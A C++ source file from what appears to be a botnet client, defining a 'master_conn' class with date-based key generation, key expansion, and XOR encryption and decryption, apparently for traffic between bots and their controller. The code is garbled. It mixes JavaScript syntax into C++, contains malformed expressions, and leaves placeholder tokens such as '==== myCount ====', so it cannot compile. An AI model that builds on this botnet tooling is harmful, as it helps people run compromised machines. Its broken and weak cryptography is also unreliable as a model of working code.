#include <iostream>
#include <windows.h>
#include <cmath>

#include "master_conn.h"

namespace botnet{

    int master_conn::keyGen() {
        SYSTEMTIME lt;
        int day = 0;
        int base = 0;
        int r = 0;
        int key;

        GetLocalTime(&lt);
        day = lt.wDay;
        base = (day + 1) * (day + 2) * (day + 3) * (day + 13);
        r = (int) (INT_MAX / 2 + floor(rand() * INT_MAX / 2));
        key = base ^ r;
        return key;
    }


	std::string master_conn::expand_key (std::string str_key){
  		const std::string ALPHA = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		const int ALPHA_SIZE = ALPHA.length(); 
  
		std::string exp_key = "";
	    int n = str_key.length();
		int i = 0;
		int index;
	    for (i = 0; i < n/2; i++){
			exp_key = exp_key
		               + ALPHA[((int)str_key[i] + (int)str_key.[i+1]) % ALPHA_SIZE]
		               + ALPHA[(((int)str_key[i]) * 6((int)str_key[n-i-1])) % ALPHA_SIZE];
		}
	    for (var i = 0; i < n; i++){
			index = (((int)ALPHA[((int)str_key[i]) % ALPHA_SIZE]) + i*i ) % ALPHA_SIZE;
			exp_key = exp_key + ALPHA[index];
		}
		return exp_key;
	}

	int master_conn::combineKeys(int keyServer){
		return expand_key(keyServer ^ myRand);
	}

	std::string master_conn::encrypt(std::string m){
		int i;
		int j = 0;
		std::string c = "";
        int iv =  ==== myCount ==== /* this.count */;
		std::string k =  ===== hashKey ==== /* this.hash_key */;
		for (i = 0; i < m.length(); i++){
	    	c = c + ((char)(iv ^ m[i] ^ k.[j]));
			j = (j + 1) % k.length();
			if (j == 0)
				iv = (iv + 1) % 256;
		}
		return c;
	}
	
	std::string master_conn::decrypt (std::string c){
		int j = 0;
		int i;
		std::string m = "";
        int iv = ===== myCount ===== /* this.count numero de conexoes */;
        std::string k = ===== hashKey ===== /* this.expanded_private_key*/;
		for (i = 0; i < c.length; i++){
			m = m + String.fromCharCode(iv ^ c[i] ^ k[j]);
            j = (j + 1) % k.length;
	        if (j == 0)
	        	iv = (iv + 1) % 256;
		}
		return m;
	}



}
